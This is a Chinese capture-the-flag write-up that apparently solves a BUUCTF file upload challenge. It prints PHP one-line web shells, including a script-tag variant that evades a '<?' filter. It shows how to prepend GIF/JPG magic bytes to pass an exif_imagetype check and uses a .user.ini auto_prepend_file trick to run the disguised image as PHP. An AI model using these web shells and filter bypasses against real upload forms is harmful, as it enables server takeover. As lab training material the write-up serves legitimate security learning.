---
Author: Coder-LYQ
Date: 2020-12-19
---



##  flag



##  思路

1. 打开网页是比较明显的文件上传的题目。一般文件上传的题目，首先就制作一句话木马上传，然后查看是否返回提示信息。

2. 最普通的一句话木马,保存为php文件，然后上传，显示如下，说明后端不允许上传php文件。

   `<?php @eval($_POST('pass'))?>`

   <img src="../images/image-20201223145657037.png" alt="image-20201223145657037" style="zoom:33%;" />

3. 然后将后缀改为.jpg后再上传，结果如下，检测出<?，说明后端对上传文件有所检查，如果有<?则不允许上传。

   <img src="../images/image-20201223145956261.png" alt="image-20201223145956261" style="zoom:33%;" />

   因此可考虑换其他木马。

   `<script language="php">eval($_POST['a']);</script>`

   <img src="../images/image-20201223150237140.png" alt="image-20201223150237140" style="zoom:33%;" />

4. 此时又显示exif_imagetype:not image!

   exif_imagetype是一个判断图像类型的函数，会读取图像的第一个字节并检查其签名

   常见图片的开头几个字节如下：

   > - JPG ：FF D8 FF E0 00 10 4A 46 49 46
   > - GIF(相当于文本的GIF89a)：47 49 46 38 39 61
   > - PNG： 89 50 4E 47

   因此，在上传的木马最前面加上以上字节即可。

   <img src="../images/image-20201223151136107.png" alt="image-20201223151136107" style="zoom:33%;" />

5. 到此步，已经可以成功上传带有木马的jpg文件，但jpg文件并不能直接执行，因此要想办法能让a.jpg以某种方式执行，然后我们就可以用御剑进行连接。

6. 上传**.user.ini**文件

   ```
   GIF
   auto_prepend_file=a.jpg
   ```

   该文件的含义是当访问同文件下的任何一个文件时，都会包含a.jpg文件。

   <img src="../images/image-20201223152036109.png" alt="image-20201223152036109" style="zoom:50%;" />

   根据显示的结果，可以看到该目录下同样还有index.php，因此此时在访问index.php文件时，默认会在index.php文件的前面加上a.jpg的内容，即可利用御剑进行连接。

   ```html
   URL地址：http://1d52bb40-2953-4635-a1e0-43a09c024d11.node3.buuoj.cn
   /uploads/e2e7ec165ba05a5e1f3198caa7e22b54/index.php
   密码：pass
   ```



## 总结

- 对于文件上传的题目，应该多尝试上传几种文件。
  - 最常见的一句话木马
  - 文件后缀
  - 图片的文件头标志
- 成功上传图片马--》使用.user.ini配置文件间接执行图片马

